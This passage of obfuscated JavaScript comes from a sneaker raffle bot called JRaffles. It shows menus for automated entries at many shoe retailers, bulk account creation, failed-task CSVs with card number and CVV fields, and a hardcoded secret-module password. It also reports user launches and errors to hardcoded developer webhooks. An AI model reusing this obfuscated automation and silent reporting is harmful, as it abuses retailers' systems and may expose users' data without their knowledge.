                            } catch (_0x635ccf) {
                                console['log'](_0x11085b['yellow'](_0x4ea3c7() + '\x20[' + _0x2e8dbc[taskModule]['name'] + ']\x20Task\x20' + (_0x4402a2 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x635ccf));
                            }
                        } catch (_0x5aa62d) {
                            console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x2e8dbc[taskModule]['name'] + ']\x20Task\x20' + (_0x4402a2 + 0x1) + '\x20:\x20' + _0x5aa62d)), _0x3b26ec = '' + _0x5aa62d;
                            var _0x465553 = await _0x1bd114(kickz[_0x4402a2], _0x41e827, 'dev', !![], _0x3b26ec);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x465553] }, _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], EMBEDS['errorDEV']), await _0x5cd94d(_0xfda3c6, EMBEDS['errorDEV']), _0x13d972 = 'yes';
                        } finally {
                            _0x585cba && _0x585cba['close']();
                            if (_0x13d972 == 'yes' && _0x34c24e != 0x5 && _0x3b26ec != 'Size\x20Not\x20Found') {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x41e827['name'] + ']\x20Task\x20' + (_0x4402a2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x34c24e + '\x20/\x205)')), _0x4402a2 = _0x4402a2 - 0x1, _0x34c24e = _0x34c24e + 0x1;
                                continue;
                            }
                            _0x13d972 == 'yes' && _0x34c24e >= 0x5 && (_0x3fe3d2(_0x4296f9[_0x4402a2], _0x41e827), _0x13d972 = 'no', _0x34c24e = 0x0), console['log']('Waiting\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x20c3d0) {
                    var _0x5c1239 = await _0x17a853(), _0x379151 = _0x57b36f['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x347e42 = _0x296e07['parse'](_0x379151, { 'header': !![] })['data'];
                    for (var _0x394dad = 0x0; _0x394dad < _0x347e42['length']; _0x394dad++) {
                        var _0x11f95e = _0x347e42[_0x394dad]['Store'], _0x52140d = _0x347e42[_0x394dad]['Mode'];
                        for (var _0x1b5e31 of _0x2e8dbc) {
                            const _0x57b211 = _0x1b5e31['name']['includes'](_0x11f95e);
                            if (!_0x57b211)
                                continue;
                            for (mode of _0x1b5e31['modules']) {
                                if (mode['name'] == _0x52140d) {
                                    console['log']('Running\x20' + _0x11085b['cyan'](mode['name'])), await mode['function'](mode, [_0x347e42[_0x394dad]], _0x5c1239);
                                    var _0x5421f2 = _0x379151['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x57b36f['writeFileSync']('../failed-tasks.csv', _0x5421f2);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x5edb9e = await _0x240076['get']('Answer');
                    if (_0x5edb9e['Answer']['toLowerCase']() == 'y') {
                        _0x57b36f['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x73bf2c(0x3e8);
                        return;
                    }
                    if (_0x5edb9e['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x73bf2c(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x73bf2c(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x3fae17(_0x80278c) {
    var _0x16ec43 = await _0x17a853(), _0x385844 = _0x57b36f['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x1aa3d0 = _0x296e07['parse'](_0x385844, { 'header': !![] })['data'];
    for (var _0x18697b = 0x0; _0x18697b < _0x1aa3d0['length']; _0x18697b++) {
        var _0x4517d7 = _0x1aa3d0[_0x18697b]['Store'], _0x5914c1 = _0x1aa3d0[_0x18697b]['Mode'];
        for (var _0x15afe0 of _0x2e8dbc) {
            const _0x4812e3 = _0x15afe0['name']['includes'](_0x4517d7);
            if (_0x4812e3)
                for (mode of _0x2e8dbc[_0x15afe0]['modules']) {
                    const _0x525026 = mode['name']['includes'](_0x5914c1);
                    _0x525026 && (_0x80278c = mode['name'], await mode['function'](_0x80278c, _0x1aa3d0[_0x18697b], _0x16ec43));
                }
        }
    }
}
async function _0x12ee8d() {
    await _0x4f6c6c(), console['clear']();
    _0x1d78d4['threads'] > 0x5 && (_0x1d78d4['threads'] = 0x5);
    if (_0x152cdf != 'devkey') {
        let _0x469071 = await _0x28ce09['autoUpdate']();
        if (_0x469071 === 'yes')
            return _0x142cd3('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x1bc9d9 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x73bf2c(0x2710);
        ;
    }
    await _0x134bd0(_0x1bc9d9);
    if (_0x1e2225 === ![])
        return console['log']('Closing\x20Browser'), await _0x73bf2c(0xbb8);
    else
        try {
            var _0x5b22a3 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x5c7ae6
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x152cdf
                    }
                ]
            }];
            const _0x9f7b3b = { 'embeds': _0x5b22a3 };
            var _0x2b0164 = await _0x1bd114(null, null, 'open', ![]);
            const _0x159a2e = { 'openDEVMSG': { 'embeds': [_0x2b0164] } };
            await _0x5cd94d(_0x2f975f, _0x159a2e['openDEVMSG']);
            async function _0x1f70df() {
                _0x3ec78c('JRaffles\x20' + _0x152cdf), console['clear'](), console['log']('Hello\x20' + _0x11085b['cyan']('' + _0x5c7ae6) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x152cdf), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x35e86f = 0x0; _0x35e86f < _0x2e8dbc['length'] - 0x4; _0x35e86f++) {
                    if (_0x35e86f >= 0xa) {
                        console['log']('\x20(' + _0x35e86f + ')\x20[' + _0x2e8dbc[_0x35e86f]['name'] + ']');
                        continue;
                    }
                    if (_0x2e8dbc[_0x35e86f]['name'] === 'Reload\x20Settings' || _0x2e8dbc[_0x35e86f]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x35e86f + ')\x20\x20[' + _0x2e8dbc[_0x35e86f]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x2e8dbc['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x2e8dbc['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x2e8dbc['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x2e8dbc['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x197e0d();
                if (taskModule > _0x2e8dbc['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x73bf2c(0x3e8), _0x1f70df();
                if (_0x2e8dbc[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x137260(_0x2e8dbc[taskModule]['modules']);
                    var _0x40fb95 = _0x2e8dbc[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x426758 = await _0x17a853();
                            await _0x40fb95['function'](_0x40fb95, _0x426758);
                        }
                        if (taskFunction == 0x2) {
                            var _0x426758 = await _0x17a853(), _0x538571 = await _0x1c608c(_0x40fb95);
                            _0x1d78d4['shuffleTasks'] && await _0x569014(_0x538571), await _0x40fb95['function'](_0x40fb95, _0x538571, _0x426758);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x426758 = await _0x17a853(), _0x538571 = await _0x1c608c(_0x40fb95);
                                _0x1d78d4['shuffleTasks'] && await _0x569014(_0x538571), await _0x40fb95['function'](_0x40fb95, _0x538571, _0x426758);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x426758 = await _0x17a853();
                                    await _0x40fb95['function'](_0x40fb95, _0x426758);
                                }
                            }
                        }
                    } catch (_0xaa47ed) {
                        console['log'](_0xaa47ed), await _0x73bf2c(0x7d0);
                    }
                    return _0x1f70df();
                }
                if (_0x2e8dbc[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x137260(_0x2e8dbc[taskModule]['modules']);
                        var _0x40fb95 = _0x2e8dbc[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x426758 = await _0x17a853(), _0x21fe4b = await _0x1c608c(_0x40fb95);
                            _0x1d78d4['shuffleTasks'] && await _0x569014(_0x21fe4b), await _0x40fb95['function'](_0x40fb95, _0x21fe4b, _0x426758);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x426758 = await _0x17a853(), _0x21fe4b = await _0x1c608c(_0x40fb95);
                                _0x1d78d4['shuffleTasks'] && await _0x569014(_0x21fe4b), await _0x40fb95['function'](_0x40fb95, _0x21fe4b, _0x426758);
                            }
                        }
                    } catch (_0x38547b) {
                        console['log'](_0x38547b), await _0x73bf2c(0xfa0);
                    }
                    return _0x1f70df();
                }
                if (_0x2e8dbc[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x137260(_0x2e8dbc[taskModule]['modules']);
                        var _0x40fb95 = _0x2e8dbc[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x426758 = await _0x17a853(), _0x21fe4b = await _0x1c608c(_0x40fb95);
                            _0x1d78d4['shuffleTasks'] && await _0x569014(_0x21fe4b), await _0x40fb95['function'](_0x40fb95, _0x21fe4b, _0x426758);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x426758 = await _0x17a853(), _0x21fe4b = await _0x1c608c(_0x40fb95);
                                _0x1d78d4['shuffleTasks'] && await _0x569014(_0x21fe4b), await _0x40fb95['function'](_0x40fb95, _0x21fe4b, _0x426758);
                            }
                        }
                    } catch (_0x5e8e76) {
                        console['log'](_0x5e8e76), await _0x73bf2c(0xfa0);
                    }
                    return _0x1f70df();
                }
                if (_0x2e8dbc[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x137260(_0x2e8dbc[taskModule]['modules']);
                    var _0x40fb95 = _0x2e8dbc[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x426758 = await _0x17a853();
                        return await _0x40fb95['function'](_0x40fb95, _0x426758), _0x1f70df();
                    }
                    var _0x426758 = await _0x17a853(), _0x592af3 = await _0x1c608c(_0x40fb95);
                    return _0x1d78d4['shuffleTasks'] && await _0x569014(_0x592af3), await _0x40fb95['function'](_0x40fb95, _0x592af3, _0x426758), _0x1f70df();
                }
                if (_0x2e8dbc[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x137260(_0x2e8dbc[taskModule]['modules']);
                    var _0x40fb95 = _0x2e8dbc[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x426758 = await _0x17a853(), _0x592af3 = await _0x1c608c(_0x40fb95);
                    return _0x1d78d4['shuffleTasks'] && await _0x569014(_0x592af3), await _0x40fb95['function'](_0x40fb95, _0x592af3, _0x426758), _0x1f70df();
                }
                if (_0x2e8dbc[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x137260(_0x2e8dbc[taskModule]['modules']);
                    var _0x40fb95 = _0x2e8dbc[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x426758 = await _0x17a853(), _0x592af3 = await _0x1c608c(_0x40fb95);
                    return _0x1d78d4['shuffleTasks'] && await _0x569014(_0x592af3), await _0x40fb95['function'](_0x40fb95, _0x592af3, _0x426758), _0x1f70df();
                }
                if (_0x2e8dbc[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x137260(_0x2e8dbc[taskModule]['modules']);
                    var _0x40fb95 = _0x2e8dbc[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x426758 = await _0x17a853(), _0x592af3 = await _0x1c608c(_0x40fb95);
                    return _0x1d78d4['shuffleTasks'] && await _0x569014(_0x592af3), await _0x40fb95['function'](_0x40fb95, _0x592af3, _0x426758), _0x1f70df();
                } else {
                    if (_0x2e8dbc[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x137260(_0x2e8dbc[taskModule]['modules']);
                        var _0x40fb95 = _0x2e8dbc[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x426758 = await _0x17a853(), _0x248ed7 = await _0x1c608c(_0x40fb95);
                            return _0x1d78d4['shuffleTasks'] && await _0x569014(_0x248ed7), await _0x40fb95['function'](_0x40fb95, _0x248ed7, _0x426758), _0x1f70df();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x426758 = await _0x17a853();
                                return await _0x40fb95['function'](_0x40fb95, null, _0x426758), _0x1f70df();
                            }
                        }
                        ;
                    } else {
                        if (_0x2e8dbc[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x137260(_0x2e8dbc[taskModule]['modules']);
                            var _0x40fb95 = _0x2e8dbc[taskModule]['modules'][taskFunction], _0x426758 = await _0x17a853(), _0x5ca906 = await _0x1c608c(_0x40fb95);
                            return _0x1d78d4['shuffleTasks'] && await _0x569014(_0x5ca906), await _0x40fb95['function'](_0x40fb95, _0x5ca906, _0x426758), await _0x73bf2c(0x1388), _0x1f70df();
                        } else {
                            if (_0x2e8dbc[taskModule]['name'] == 'Google\x20Forms') {
                                try {
                                    let _0x2ccc32 = { 'headers': { 'content-type': 'application/json' } }, _0x123f76 = { 'key': _0x1bc9d9 }, _0xf2a09a = await _0x3d9190['post']('https://jraffles.herokuapp.com/beta', _0x123f76, _0x2ccc32);
                                    if (_0xf2a09a['status'] != 0xc8)
                                        throw new Error('No\x20Beta\x20Access..');
                                    console['log']('Hello,\x20' + _0x11085b['cyan'](_0x5c7ae6) + '.\x20Beta\x20Access\x20Granted.'), await _0x73bf2c(0x3e8);
                                } catch (_0x3b930b) {
                                    return console['log']('No\x20Beta\x20Access.'), await _0x73bf2c(0x7d0), _0x1f70df();
                                }
                                taskFunction = await _0x137260(_0x2e8dbc[taskModule]['modules']);
                                var _0x40fb95 = _0x2e8dbc[taskModule]['modules'][taskFunction], _0x426758 = await _0x17a853(), _0x5ca906 = await _0x1c608c(_0x40fb95);
                                return _0x1d78d4['shuffleTasks'] && await _0x569014(_0x5ca906), await _0x40fb95['function'](_0x40fb95, _0x5ca906, _0x426758), await _0x73bf2c(0x1388), _0x1f70df();
                            } else {
                                if (_0x2e8dbc[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x137260(_0x2e8dbc[taskModule]['modules']);
                                    var _0x40fb95 = _0x2e8dbc[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x426758 = await _0x17a853(), _0x248ed7 = await _0x1c608c(_0x40fb95);
                                        return _0x1d78d4['shuffleTasks'] && await _0x569014(_0x248ed7), await _0x40fb95['function'](_0x40fb95, _0x248ed7, _0x426758), _0x1f70df();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x426758 = await _0x17a853();
                                            return await _0x40fb95['function'](_0x40fb95, null, _0x426758), _0x1f70df();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x2e8dbc[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x137260(_0x2e8dbc[taskModule]['modules']);
                                        var _0x40fb95 = _0x2e8dbc[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x40fb95);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x2e8dbc[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x137260(_0x2e8dbc[taskModule]['modules']);
                                            var _0x40fb95 = _0x2e8dbc[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x426758 = await _0x17a853(), _0x294472 = await _0x1c608c(_0x40fb95);
                                                return _0x1d78d4['shuffleTasks'] && await _0x569014(_0x294472), await _0x40fb95['function'](_0x40fb95, _0x294472, _0x426758), _0x1f70df();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x426758 = await _0x17a853(), _0x294472 = await _0x1c608c(_0x40fb95);
                                                    return _0x1d78d4['shuffleTasks'] && await _0x569014(_0x294472), await _0x40fb95['function'](_0x40fb95, _0x294472, _0x426758), _0x1f70df();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x2e8dbc[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x137260(_0x2e8dbc[taskModule]['modules']);
                                                var _0x40fb95 = _0x2e8dbc[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x426758 = await _0x17a853(), _0x4ef423 = await _0x1c608c(_0x40fb95);
                                                    return _0x1d78d4['shuffleTasks'] && await _0x569014(_0x4ef423), await _0x40fb95['function'](_0x40fb95, _0x4ef423, _0x426758), _0x1f70df();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x426758 = await _0x17a853(), _0x4ef423 = await _0x1c608c(_0x40fb95);
                                                        return _0x1d78d4['shuffleTasks'] && await _0x569014(_0x4ef423), await _0x40fb95['function'](_0x40fb95, _0x4ef423, _0x426758), _0x1f70df();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x2e8dbc[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x137260(_0x2e8dbc[taskModule]['modules']);
                                                    var _0x40fb95 = _0x2e8dbc[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x426758 = await _0x17a853(), _0x2282b8 = await _0x1c608c(_0x40fb95);
                                                        return _0x1d78d4['shuffleTasks'] && await _0x569014(_0x2282b8), await _0x40fb95['function'](_0x40fb95, _0x2282b8, _0x426758), _0x1f70df();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x426758 = await _0x17a853(), _0x2282b8 = await _0x1c608c(_0x40fb95);
                                                            return _0x1d78d4['shuffleTasks'] && await _0x569014(_0x2282b8), await _0x40fb95['function'](_0x40fb95, _0x2282b8, _0x426758), _0x1f70df();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x2e8dbc[taskModule]['name'] == 'JD') {
                                                        taskFunction = await _0x137260(_0x2e8dbc[taskModule]['modules']);
                                                        var _0x40fb95 = _0x2e8dbc[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x426758 = await _0x17a853(), _0x2cdf72 = await _0x1c608c(_0x40fb95);
                                                            return _0x1d78d4['shuffleTasks'] && await _0x569014(_0x2cdf72), await _0x40fb95['function'](_0x40fb95, _0x2cdf72, _0x426758), _0x1f70df();
                                                        }
                                                    } else {
                                                        if (_0x2e8dbc[taskModule]['name'] == 'Seven\x20Store')
                                                            return console['log']('returning\x20to\x20menu'), await _0x73bf2c(0x3e8), _0x1f70df();
                                                        else {
                                                            if (_0x2e8dbc[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                var _0x41809f = _0x2e8dbc[taskModule]['name'], _0x426758 = await _0x17a853();
                                                                return await _0x358d68(_0x41809f, _0x426758), _0x1f70df();
                                                            } else {
                                                                if (_0x2e8dbc[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                    taskFunction = await _0x137260(_0x2e8dbc[taskModule]['modules']);
                                                                    var _0x40fb95 = _0x2e8dbc[taskModule]['modules'][taskFunction];
                                                                    return await _0x40fb95['function'](_0x40fb95), _0x1f70df();
                                                                } else {
                                                                    if (_0x2e8dbc[taskModule]['name'] == 'Change\x20Settings') {
                                                                        console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                        var _0x25df1e = 0x0;
                                                                        for (const _0x30b96a in _0x1d78d4) {
                                                                            console['log']('(' + _0x25df1e + ')\x20' + _0x30b96a + '\x20:\x20' + _0x1d78d4[_0x30b96a]), _0x25df1e++;
                                                                        }
                                                                        console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x25df1e + ')\x20Return\x20to\x20Main\x20Menu');
                                                                        var _0x55d8fd = await _0x33eff7();
                                                                        if (_0x55d8fd == _0x25df1e)
                                                                            return _0x1f70df();
                                                                        console['clear'];
                                                                        var _0x3c6dbe = 0x0;
                                                                        for (var _0xe96c43 in _0x1d78d4) {
                                                                            if (_0x55d8fd == _0x3c6dbe) {
                                                                                console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0xe96c43 + '\x20:'), _0x1d78d4[_0xe96c43] = await _0x1d5501(), _0x57b36f['writeFileSync']('../settings.json', JSON['stringify'](_0x1d78d4));
                                                                                break;
                                                                            } else
                                                                                _0x3c6dbe++;
                                                                        }
                                                                        return console['log']('Settings\x20Saved!'), await _0x73bf2c(0xbb8), _0x1f70df();
                                                                    } else {
                                                                        if (_0x2e8dbc[taskModule]['name'] == 'Reload\x20Settings')
                                                                            return console['log']('Reloading\x20settings'), await _0x4f6c6c(), _0x1f70df();
                                                                        else {
                                                                            if (taskModule == 0x45) {
                                                                                _0x2e8dbc[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                var _0x297f08 = await _0x4ae888();
                                                                                _0x297f08 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x5e7947(), await afewFunction(_0xb346cf[_0x338c99], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x73bf2c(0xbb8));
                                                                            } else {
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x1f70df();
            } catch (_0x2753b6) {
                return console['log'](_0x2753b6), await _0x73bf2c(0x2710), _0x1f70df();
            }
        } catch (_0x2f1e4b) {
            return console['log'](_0x2f1e4b), await _0x73bf2c(0x3a98);
        }
}
;
_0x3ec78c('JRaffles\x20' + _0x152cdf);
try {
    _0x4f6c6c(), _0x12ee8d();
} catch (_0x5e54bb) {
    console['log'](_0x5e54bb);
}